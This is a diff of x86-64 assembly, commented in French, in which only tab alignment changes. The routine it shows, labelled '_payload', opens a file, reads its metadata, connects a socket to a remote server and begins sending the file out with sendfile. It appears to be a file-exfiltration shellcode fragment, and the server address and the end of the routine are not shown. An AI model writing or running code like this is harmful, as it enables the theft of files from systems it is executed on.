@@ -9,17 +9,17 @@ _payload:
     mov rbp, rsp
 
     ; Ouvrir le fichier
-    mov rax, 2			; SYS_open
+    mov rax, 2				; SYS_open
     lea rdi, [rel path]		; Chemin du fichier
-    mov rsi, 0			; O_RDONLY
+    mov rsi, 0				; O_RDONLY
     syscall
     test rax, rax
-    js exit				; Gestion de l'erreur
+    js exit					; Gestion de l'erreur
 
     mov r12, rax ; Descripteur de fichier
 
     ; Récupérer les métadonnées du fichier
-    mov rax, 4				; SYS_stat
+    mov rax, 4					; SYS_stat
     lea rdi, [rel path]			; Chemin du fichier
     lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
     syscall
@@ -39,13 +39,13 @@ _payload:
     mov r13, rax ; Descripteur de socket
 
     ; Connecter au serveur
-    mov rax, 42				; SYS_connect
-    mov rdi, r13			; Descripteur de socket
+    mov rax, 42					; SYS_connect
+    mov rdi, r13				; Descripteur de socket
     lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
-    mov rdx, 16				; Taille de sockaddr_in
+    mov rdx, 16					; Taille de sockaddr_in
     syscall
     test rax, rax
-    js error_socket			; Gestion de l'erreur
+    js error_socket				; Gestion de l'erreur
 
 	; Send the file
 	mov rax, 40						; SYS_sendfile
